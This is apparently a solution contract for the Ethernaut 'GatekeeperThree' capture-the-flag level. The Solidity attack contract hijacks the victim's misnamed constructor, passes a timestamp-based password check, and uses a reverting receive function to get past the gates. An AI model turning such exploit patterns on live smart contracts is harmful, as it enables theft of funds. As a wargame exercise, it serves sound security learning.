// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./GatekeeperThree.sol";

contract AttackGatekeeperThree {
    GatekeeperThree immutable victim;

    constructor(GatekeeperThree _victim) {
        victim = _victim;
    }

    function attack() external payable {
        victim.construct0r();
        victim.createTrick();
        victim.getAllowance(block.timestamp);

        (bool sent,) = payable(victim).call{value: msg.value}("");
        require(sent == true, "fail to send ether!");

        victim.enter();
    }

    receive() external payable {
        revert("Fail to send to this contract!");
    }
}
